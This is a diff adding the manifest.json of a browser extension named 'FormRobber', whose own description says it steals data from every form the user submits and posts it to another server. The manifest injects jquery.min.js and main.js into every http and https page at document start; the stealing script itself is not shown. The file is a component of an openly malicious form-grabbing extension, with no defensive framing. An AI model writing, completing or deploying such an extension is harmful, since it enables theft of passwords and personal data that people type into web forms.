@@ -1,0 +1,12 @@
+{
+  "name": "FormRobber",
+  "version": "1.0",
+  "manifest_version": 2,
+  "description": "It stoles your data from every form you submit and POST them to another server.",
+  "permissions": ["tabs"],
+  "content_scripts": [{
+      "matches": ["http://*/*", "https://*/*"],
+      "js": ["jquery.min.js", "main.js"],
+      "run_at": "document_start"
+    }]
+}
